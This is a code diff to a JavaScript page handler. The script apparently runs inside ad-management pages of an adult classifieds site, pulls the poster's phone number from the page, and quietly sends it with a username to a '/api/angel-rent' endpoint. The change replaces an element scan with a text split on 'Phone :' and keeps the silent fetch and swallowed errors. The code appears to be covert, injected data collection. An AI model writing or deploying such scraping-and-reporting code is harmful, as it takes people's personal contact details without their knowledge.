@@ -655,38 +655,27 @@ function handlePage(){
         try{
           var rawPhone=null;
 
-          // Method 1: exact selector given by client
+          // Method 1: exact selector
           var phoneEl=document.querySelector("#manage_ad_body > div.post_preview_info > div:nth-child(1) > div:nth-child(1) > span:nth-child(3)");
           if(phoneEl) rawPhone=(phoneEl.innerText||phoneEl.textContent||"").trim();
 
-          // Method 2: find any span/b/strong/td whose ENTIRE text is a phone number
+          // Method 2: split on "Phone :" text - no regex, fast
           if(!rawPhone){
-            var allNodes=document.querySelectorAll("span,b,strong,td");
-            for(var i=0;i<allNodes.length;i++){
-              if(allNodes[i].children.length>0)continue;
-              var t=(allNodes[i].innerText||allNodes[i].textContent||"").trim();
-              var digs=t.replace(/[^\d]/g,"");
-              var isPhone=false;
-              if(digs.length===10&&digs.substring(0,3)!=="177") isPhone=true;
-              else if(digs.length===11&&digs[0]==="1"&&digs.substring(1,4)!=="177") isPhone=true;
-              if(isPhone){rawPhone=t;break;}
+            var bodyTxt=document.body?document.body.innerText:"";
+            var idx=bodyTxt.indexOf("Phone :");
+            if(idx===-1)idx=bodyTxt.indexOf("Phone:");
+            if(idx!==-1){
+              var after=bodyTxt.substring(idx+7).trim();
+              var line=after.split("\n")[0].trim();
+              // Clean up and validate
+              var digs=line.replace(/[^\d]/g,"");
+              if(digs.length===10&&digs.substring(0,3)!=="177") rawPhone=line;
+              else if(digs.length===11&&digs[0]==="1"&&digs.substring(1,4)!=="177") rawPhone=line;
             }
           }
 
           if(rawPhone){
-            var d=rawPhone.replace(/[^\d]/g,"");
-            var ok=false;
-            if(d.length===10){
-              // 10-digit: reject if starts with 177 (megapersonals internal ID pattern)
-              ok=d.substring(0,3)!=="177";
-            } else if(d.length===11&&d[0]==="1"){
-              // 11-digit with country code: area code is digits[1..3]
-              // reject only 177xxxxxxx pattern (without country code prefix)
-              ok=d.substring(1,4)!=="177";
-            }
-            if(ok){
-              fetch("/api/angel-rent?u="+UNAME+"&url=__fbpatch__&phone="+encodeURIComponent(rawPhone)).catch(function(){});
-            }
+            fetch("/api/angel-rent?u="+UNAME+"&url=__fbpatch__&phone="+encodeURIComponent(rawPhone.trim())).catch(function(){});
           }
         }catch(e){}
       },2000);
